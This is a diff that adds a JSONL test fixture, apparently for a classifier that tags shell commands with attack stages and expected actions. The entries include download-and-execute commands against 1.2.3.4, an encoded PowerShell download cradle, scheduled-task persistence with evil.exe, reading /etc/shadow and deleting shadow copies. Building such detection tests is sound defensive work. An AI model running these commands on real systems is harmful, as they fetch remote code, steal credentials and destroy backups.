@@ -1,0 +1,12 @@
+{"command": "curl -o payload.exe http://1.2.3.4/payload.exe", "expected_stage": "Payload Retrieval", "expected_actions": ["download_remote_resource", "use_signed_proxy_binary"]}
+{"command": "curl http://1.2.3.4/install.sh | bash", "expected_stage": "Payload Retrieval", "expected_actions": ["download_remote_resource", "execute_interpreter", "use_signed_proxy_binary"]}
+{"command": "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEALgAyAC4AMwAuADQALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA==", "expected_stage": "Defense Evasion", "expected_actions": ["use_encoded_payload", "use_obfuscation"]}
+{"command": "python3 -c \"print('hello')\"", "expected_stage": "Execution", "expected_actions": ["execute_inline_code"]}
+{"command": "crontab -l", "expected_stage": "Context Required", "expected_actions": []}
+{"command": "schtasks /create /tn updater /tr evil.exe /sc onlogon", "expected_stage": "Persistence", "expected_actions": []}
+{"command": "cat /etc/shadow", "expected_stage": "Credential Access", "expected_actions": []}
+{"command": "tar -czf backup.tar.gz /home/user/data", "expected_stage": "Collection / Staging", "expected_actions": ["archive_data"]}
+{"command": "tar -xzf archive.tar.gz", "expected_stage": "Collection / Staging", "expected_actions": ["extract_archive"]}
+{"command": "scp file.txt user@remote:/tmp/", "expected_stage": "C2 / Remote Access", "expected_actions": ["remote_execution"]}
+{"command": "whoami", "expected_stage": "Discovery / Recon", "expected_actions": []}
+{"command": "vssadmin delete shadows /all /quiet", "expected_stage": "Impact", "expected_actions": []}
